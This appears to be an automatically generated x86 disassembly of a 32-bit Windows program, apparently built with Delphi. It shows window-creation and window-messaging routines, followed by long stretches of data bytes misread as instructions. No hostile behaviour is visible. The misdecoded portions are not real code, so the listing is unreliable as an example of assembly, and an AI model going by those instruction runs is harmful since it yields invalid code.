mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a44
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_4068ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a54
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a44
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406944
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406a39
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406a68
retn
sub_406a74
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406aa0
retn
sub_406aac
push ss
inc esi
add al dh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add cl dh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add dl dh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add bl dh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add ah dh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add ch dh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add dh dh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add bh dh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add al bh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add cl bh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add dl bh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add bl bh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add ah bh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add ch bh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add dh bh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add bh bh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add al ah
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add cl ah
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add dl ah
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add bl ah
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add ah ah
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add ch ah
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add dh ah
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add bh ah
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add al ch
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add cl ch
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add dl ch
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add bl ch
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add ah ch
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add ch ch
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add dh ch
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add bh ch
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add al dl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add cl dl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add dl dl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add bl dl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add ah dl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add ch dl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add dh dl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add bh dl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add al bl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add cl bl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add dl bl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add bl bl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add ah bl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add ch bl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add dh bl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add bh bl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add al al
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add cl al
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add dl al
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add bl al
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add ah al
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add ch al
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add dh al
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add bh al
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add al cl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add cl cl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add dl cl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add bl cl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add ah cl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add ch cl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add dh cl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add bh cl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ eax + 0x640000ff ] dh
push ss
inc esi
add [ ecx + 0x640000ff ] dh
push ss
inc esi
add [ edx + 0x640000ff ] dh
push ss
inc esi
add [ ebx + 0x640000ff ] dh
push ss
inc esi
add [ edi + edi * 8 + 0x16640000 ] dh
inc esi
add [ ebp + 0x640000ff ] dh
push ss
inc esi
add [ esi + 0x640000ff ] dh
push ss
inc esi
add [ edi + 0x640000ff ] dh
push ss
inc esi
add [ eax + 0x640000ff ] bh
push ss
inc esi
add [ ecx + 0x640000ff ] bh
push ss
inc esi
add [ edx + 0x640000ff ] bh
push ss
inc esi
add [ ebx + 0x640000ff ] bh
push ss
inc esi
add [ edi + edi * 8 + 0x16640000 ] bh
inc esi
add [ ebp + 0x640000ff ] bh
push ss
inc esi
add [ esi + 0x640000ff ] bh
push ss
inc esi
add [ edi + 0x640000ff ] bh
push ss
inc esi
add [ eax + 0x640000ff ] ah
push ss
inc esi
add [ ecx + 0x640000ff ] ah
push ss
inc esi
add [ edx + 0x640000ff ] ah
push ss
inc esi
add [ ebx + 0x640000ff ] ah
push ss
inc esi
add [ edi + edi * 8 + 0x16640000 ] ah
inc esi
add [ ebp + 0x640000ff ] ah
push ss
inc esi
add [ esi + 0x640000ff ] ah
push ss
inc esi
add [ edi + 0x640000ff ] ah
push ss
inc esi
add [ eax + 0x640000ff ] ch
push ss
inc esi
add [ ecx + 0x640000ff ] ch
push ss
inc esi
add [ edx + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406db0
retn
sub_406e5d
insd
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
sub al 0xb4
inc eax
add [ edx + esi ] ah
inc eax
add [ esi ] cl
inc ebp
dec eax
popad
jo r-xdata
insb
xor al 0x40
js r-xdata
add [ eax ] al
nop
outsd
inc eax
add [ eax ] dl
lea eax [ eax ]
cmp [ edi + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
outsd
inc eax
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x70 ] cl
inc eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
outsd
inc eax
add [ eax ] dl
inc ebp
jb r-xdata
add [ eax ] dl
add [ eax ] al
add ah cl
insd
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x2440af66
xor al [ eax ]
or eax [ ebp + 0x49 ]
outsb
dec edi
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ edi + 0x40 ] ch
add ah cl
xor [ eax ] eax
sub al 0xb4
inc eax
imul ebp [ edi + 0x6e ] 0x406edc90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
outsb
inc eax
add [ eax ] dl
add [ eax ] al
add [ esi + ebp * 2 ] dh
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x2440b0ce
xor al [ eax ]
or al [ ebp + 0x44 ]
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
clc
jo r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
jo r-xdata
popad
insb
mov eax eax
call sub_40b010
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004070 ] ah
jb r-xdata
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x2440b016
xor al [ eax ]
adc al [ ebp + 0x45 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x1040b030
outsd
jb r-xdata
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ ebx ] cl
inc ebp
push edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
outsd
jb r-xdata
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x2440b076
xor al [ eax ]
or [ ebp + 0x49 ] eax
outsb
je r-xdata
add [ eax ] al
add ah bh
outsd
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
add [ edx + esi ] ah
inc eax
add [ eax * 2 + 0x4f74754f ] cl
dec bp
insd
outsd
jb r-xdata
mov ah 0x40
add [ eax ] al
add ah cl
insd
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x2440afbe
xor al [ eax ]
or [ ebp + 0x45 ] eax
js r-xdata
outsd
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1000406f ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
jno r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x71 ] dl
inc eax
add [ eax ] dl
add [ eax ] al
add ah bh
outsd
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
popad
outsb
inc ebp
jb r-xdata
add [ eax ] dl
add [ eax ] al
add ah bh
outsd
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
js r-xdata
inc eax
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ edx ] dl
inc ebp
inc ebp
shl [ eax + 0x4070 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 ] al
add [ eax ] dl
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x2440b1da
xor al [ eax ]
or al [ ebp + 0x4d ]
dec edi
jno r-xdata
popad
je r-xdata
xor [ eax ] eax
and al 0x32
inc eax
add [ edx ] cl
inc ebp
dec ebp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x10004070 ]
imul ebp [ edi + 0x6e ] 0x40704890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x40725c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
jb r-xdata
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ eax * 2 + 0x4f746e49 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 ] cl
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x71 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x2440b33a
xor al [ eax ]
or al [ ebp + 0x55 ]
outsb
jb r-xdata
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x2440b2e2
xor al [ eax ]
or [ ebp + 0x4f ] eax
jbe r-xdata
add [ eax ] al
inc esp
imul esi [ esi + 0x69 ] 0x72b46564
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 + 0x100040 ] dh
add [ eax ] al
pushad
jno r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax + 0x71 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 + 0x40 ] bl
outsd
jb r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x71 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x2440b232
xor al [ eax ]
or al [ ebp + 0x49 ]
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x72
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ ebx + 0x40 ] 0x0
or al 0x0
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
jb r-xdata
call 0x2440b17e
xor al [ eax ]
or al 0x45
dec ecx
outsb
je r-xdata
add al 0x72
inc eax
add [ eax ] al
add ah cl
xor [ eax ] eax
call 0x2440b126
xor al [ eax ]
or eax [ ebp + 0x52 ]
inc eax
add [ ecx + esi * 2 + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
jae r-xdata
add [ eax ] dl
add [ eax ] al
add [ esi + ebp * 2 ] dh
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
sub al 0xb4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
outsd
ja r-xdata
inc eax
add [ edx + esi ] ah
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ esp + esi * 4 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 2 ] bl
inc eax
add [ eax + eax ] cl
add [ eax ] al
int3
add [ eax ] al
int3
add [ eax + eax ] cl
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x2440b28a
xor al [ eax ]
or eax [ ebp + 0x5a ]
jb r-xdata
ror [ ebx + esi * 2 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x74 ] bh
inc eax
add [ eax ] dl
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x2440b4a6
xor al [ eax ]
adc [ ebp + 0x41 ] al
arpl [ ebx + 0x65 ] sp
jae r-xdata
lea eax [ eax ]
sbb al 0x74
add [ eax ] al
add [ ebx + esi * 2 + 0x40 ] ah
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jne r-xdata
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
outsb
lea eax [ eax ]
fdiv [ eax + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdiv [ eax + eax * 2 ]
adc [ eax ] al
add [ eax ] al
inc esp
outsd
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
inc eax
add [ eax ] al
add [ eax ] al
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ eax * 2 + 0x61766e49 ] cl
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add [ esp + esi * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 2 + 0x100040 ] cl
add [ eax ] al
inc esp
outsd
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x2440b5ba
xor al [ eax ]
or [ ebp + 0x43 ] eax
outsd
outsb
je r-xdata
add [ eax ] dl
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x2440b55e
xor al [ eax ]
push cs
inc ebp
push ebx
je r-xdata
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x76 ] al
inc eax
add [ eax + eax ] cl
add [ eax ] al
int3
outsd
insb
inc ebx
mov eax eax
in al 0x75
inc eax
add [ eax ] al
add [ eax ] al
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
nop
xor [ ebp + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x75
inc eax
insb
outsd
ja r-xdata
call 0x2440b506
xor al [ eax ]
or al [ ebp + 0x50 ]
jb r-xdata
sub_407543
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 2 + 0x100040 ] cl
add [ eax ] al
inc esp
outsd
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x2440b5ba
xor al [ eax ]
or [ ebp + 0x43 ] eax
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x76 ] al
inc eax
add [ eax + eax ] cl
add [ eax ] al
int3
outsd
insb
inc ebx
mov eax eax
in al 0x75
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
int3
sub_4078b8
cdq
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x52ffbf88 ] ah
js r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x78 ] bh
inc eax
add [ ecx - 0x76ffbf88 ] al
js r-xdata
lodsd [ esi ]
push edx
popad
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x79 ] al
inc eax
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x34640040 ] dl
inc eax
add [ eax ] ch
push esi
inc eax
add [ esi + edx * 2 ] dh
inc eax
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ esi + edx * 2 + 0x40 ] al
add [ ecx + 0x1004078 ] dl
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
insb
jne r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
